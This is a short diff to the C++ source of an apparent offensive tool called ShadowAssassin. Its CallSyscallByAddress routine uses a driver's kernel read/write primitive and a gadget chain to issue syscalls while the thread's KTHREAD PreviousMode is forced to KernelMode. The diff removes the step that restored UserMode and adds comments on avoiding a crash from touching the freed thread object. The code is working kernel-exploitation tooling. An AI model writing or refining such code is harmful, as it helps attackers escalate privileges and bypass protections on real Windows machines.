@@ -313,6 +313,11 @@ UINT64 ShadowAssassin::CallSyscallByAddress(UINT64 funcAddr, const std::vector<U
 
     UINT64 tFire = TimeUs();
     frameManager.ContinueThread();
+    // Do NOT touch pmAligned after this point — the thread exits immediately after
+    // DummyThreadProc returns 0, freeing the KTHREAD. Any read or write through the
+    // driver to that address hits freed pool and BSODs with 0x50.
+    // PreviousMode stays KernelMode until thread exit; DummyThreadProc makes no
+    // syscalls so this is harmless.
 
     // Poll until gadget3 writes the real return value (replaces sentinel)
     UINT64 retVal = SENTINEL;
@@ -325,14 +330,6 @@ UINT64 ShadowAssassin::CallSyscallByAddress(UINT64 funcAddr, const std::vector<U
     if (retVal == SENTINEL) {
         DbgLog("[CallSyscallByAddress] TIMEOUT: chain did not complete in 2000ms\n");
         retVal = 0;
-    }
-
-    // Restore PreviousMode = UserMode (1)
-    if (kthread) {
-        UINT64 pmQword = 0;
-        readFn(&pmQword, pmAligned, sizeof(UINT64));
-        UINT64 pmQwordUser = (pmQword & ~(0xFFULL << (pmByte * 8))) | (1ULL << (pmByte * 8));
-        writeFn(pmAligned, pmQwordUser);
     }
     DbgLog("[CallSyscallByAddress] -> 0x%llX (chain %s, total %s)\n\n",
         retVal, FmtMs(TimeUs() - tFire).c_str(), FmtMs(TimeUs() - t0).c_str());
